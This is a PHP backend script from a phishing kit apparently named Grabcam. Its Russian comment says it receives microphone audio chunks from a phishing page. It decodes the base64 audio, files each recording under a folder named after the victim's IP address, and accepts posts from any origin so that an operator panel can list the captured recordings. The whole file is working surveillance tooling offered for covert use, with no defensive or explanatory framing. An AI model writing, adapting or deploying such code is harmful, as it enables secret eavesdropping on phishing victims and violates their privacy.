<?php
/**
 * Принимает аудио-чанки с страницы фишинга (микрофон), сохраняет в Photo/IP/audio/.
 * Панель Grabcam отображает список записей через API.
 */
header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(204);
    exit;
}

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['success' => false, 'error' => 'Method not allowed']);
    exit;
}

function getClientIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) return $_SERVER['HTTP_CLIENT_IP'];
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ips[0]);
    }
    return $_SERVER['REMOTE_ADDR'];
}

$clientIP = getClientIP();
$deviceId = preg_replace('/[^a-zA-Z0-9]/', '_', $clientIP);
$baseDir = __DIR__ . '/Photo';
$deviceDir = $baseDir . '/' . $deviceId;
$audioDir = $deviceDir . '/audio';

$raw = file_get_contents('php://input');
$data = json_decode($raw, true);

if (!is_array($data) || empty($data['audio'])) {
    echo json_encode(['success' => false, 'error' => 'No audio data']);
    exit;
}

if (!file_exists($deviceDir)) {
    mkdir($deviceDir, 0777, true);
}
if (!file_exists($audioDir)) {
    mkdir($audioDir, 0777, true);
}

$audioB64 = $data['audio'];
$chunkIndex = isset($data['chunk']) ? (int)$data['chunk'] : 0;
$decoded = base64_decode($audioB64, true);

if ($decoded === false || strlen($decoded) === 0) {
    echo json_encode(['success' => false, 'error' => 'Invalid base64']);
    exit;
}

$ext = 'webm';
$filename = $audioDir . '/mic_' . date('Ymd_His') . '_' . $chunkIndex . '.' . $ext;
file_put_contents($filename, $decoded, LOCK_EX);

echo json_encode(['success' => true]);
?>
